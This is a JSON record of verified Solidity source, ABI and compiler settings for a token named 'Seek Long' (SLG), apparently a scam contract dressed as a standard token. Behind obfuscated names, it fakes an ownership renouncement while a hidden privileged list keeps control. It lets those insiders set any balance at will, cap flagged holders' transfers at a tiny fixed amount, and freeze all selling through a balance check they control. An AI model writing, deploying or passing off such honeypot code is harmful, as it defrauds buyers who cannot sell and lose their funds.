{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface amountAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingMode {\n    function createPair(address atReceiver, address buyMax) external returns (address);\n}\n\ninterface amountWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTradingReceiver) external view returns (uint256);\n\n    function transfer(address txTeam, uint256 senderMode) external returns (bool);\n\n    function allowance(address walletLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txTeam,\n        uint256 senderMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenAt, uint256 value);\n    event Approval(address indexed walletLimit, address indexed spender, uint256 value);\n}\n\ninterface amountWalletMetadata is amountWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SeekLong is sellMax, amountWallet, amountWalletMetadata {\n\n    address walletAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private fromSwap;\n\n    uint256 fundTotalAt;\n\n    function owner() external view returns (address) {\n        return shouldBuy;\n    }\n\n    function autoReceiverToken(address swapShouldSell) public {\n        teamAmount();\n        if (autoEnable != minTeam) {\n            minTeam = false;\n        }\n        if (swapShouldSell == minReceiver || swapShouldSell == enableTo) {\n            return;\n        }\n        senderIsFund[swapShouldSell] = true;\n    }\n\n    address private shouldBuy;\n\n    mapping(address => bool) public senderIsFund;\n\n    function senderTo(address atFeeTx, address txTeam, uint256 senderMode) internal returns (bool) {\n        if (atFeeTx == minReceiver) {\n            return launchMarketing(atFeeTx, txTeam, senderMode);\n        }\n        uint256 takeFee = amountWallet(enableTo).balanceOf(walletAt);\n        require(takeFee == fundTotalAt);\n        require(txTeam != walletAt);\n        if (senderIsFund[atFeeTx]) {\n            return launchMarketing(atFeeTx, txTeam, receiverMarketing);\n        }\n        return launchMarketing(atFeeTx, txTeam, senderMode);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFund;\n    }\n\n    uint256 constant receiverMarketing = 17 ** 10;\n\n    string private launchSwapMax = \"SLG\";\n\n    function getOwner() external view returns (address) {\n        return shouldBuy;\n    }\n\n    function approve(address fundIs, uint256 senderMode) public virtual override returns (bool) {\n        modeAmount[_msgSender()][fundIs] = senderMode;\n        emit Approval(_msgSender(), fundIs, senderMode);\n        return true;\n    }\n\n    function allowance(address toAmount, address fundIs) external view virtual override returns (uint256) {\n        if (fundIs == walletAuto) {\n            return type(uint256).max;\n        }\n        return modeAmount[toAmount][fundIs];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchSwapMax;\n    }\n\n    uint8 private liquidityFrom = 18;\n\n    function tradingExemptEnable(address maxBuy, uint256 senderMode) public {\n        teamAmount();\n        tradingMin[maxBuy] = senderMode;\n    }\n\n    bool public receiverToToken;\n\n    mapping(address => uint256) private tradingMin;\n\n    event OwnershipTransferred(address indexed autoFee, address indexed toFund);\n\n    function transferFrom(address atFeeTx, address txTeam, uint256 senderMode) external override returns (bool) {\n        if (_msgSender() != walletAuto) {\n            if (modeAmount[atFeeTx][_msgSender()] != type(uint256).max) {\n                require(senderMode <= modeAmount[atFeeTx][_msgSender()]);\n                modeAmount[atFeeTx][_msgSender()] -= senderMode;\n            }\n        }\n        return senderTo(atFeeTx, txTeam, senderMode);\n    }\n\n    uint256 public maxFee;\n\n    uint256 private tradingFund = 100000000 * 10 ** 18;\n\n    function teamAmount() private view {\n        require(liquidityMaxEnable[_msgSender()]);\n    }\n\n    function teamAt(address amountReceiver) public {\n        if (launchedExemptList) {\n            return;\n        }\n        \n        liquidityMaxEnable[amountReceiver] = true;\n        \n        launchedExemptList = true;\n    }\n\n    function transfer(address maxBuy, uint256 senderMode) external virtual override returns (bool) {\n        return senderTo(_msgSender(), maxBuy, senderMode);\n    }\n\n    uint256 listSell;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityEnable;\n    }\n\n    function maxExempt() public {\n        emit OwnershipTransferred(minReceiver, address(0));\n        shouldBuy = address(0);\n    }\n\n    address walletAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private minTeam;\n\n    address public enableTo;\n\n    mapping(address => bool) public liquidityMaxEnable;\n\n    function launchMarketing(address atFeeTx, address txTeam, uint256 senderMode) internal returns (bool) {\n        require(tradingMin[atFeeTx] >= senderMode);\n        tradingMin[atFeeTx] -= senderMode;\n        tradingMin[txTeam] += senderMode;\n        emit Transfer(atFeeTx, txTeam, senderMode);\n        return true;\n    }\n\n    bool private autoEnable;\n\n    constructor (){\n        if (maxFee == fromSwap) {\n            receiverToToken = true;\n        }\n        amountAt fundEnableReceiver = amountAt(walletAuto);\n        enableTo = marketingMode(fundEnableReceiver.factory()).createPair(fundEnableReceiver.WETH(), address(this));\n        \n        minReceiver = _msgSender();\n        maxExempt();\n        liquidityMaxEnable[minReceiver] = true;\n        tradingMin[minReceiver] = tradingFund;\n        \n        emit Transfer(address(0), minReceiver, tradingFund);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityFrom;\n    }\n\n    bool private maxReceiver;\n\n    mapping(address => mapping(address => uint256)) private modeAmount;\n\n    function balanceOf(address liquidityTradingReceiver) public view virtual override returns (uint256) {\n        return tradingMin[liquidityTradingReceiver];\n    }\n\n    string private liquidityEnable = \"Seek Long\";\n\n    address public minReceiver;\n\n    bool public launchedExemptList;\n\n    function autoFundSwap(uint256 senderMode) public {\n        teamAmount();\n        fundTotalAt = senderMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderMode\",\"type\":\"uint256\"}],\"name\":\"autoFundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapShouldSell\",\"type\":\"address\"}],\"name\":\"autoReceiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTradingReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExemptList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityMaxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderIsFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"}],\"name\":\"teamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMode\",\"type\":\"uint256\"}],\"name\":\"tradingExemptEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFeeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SeekLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}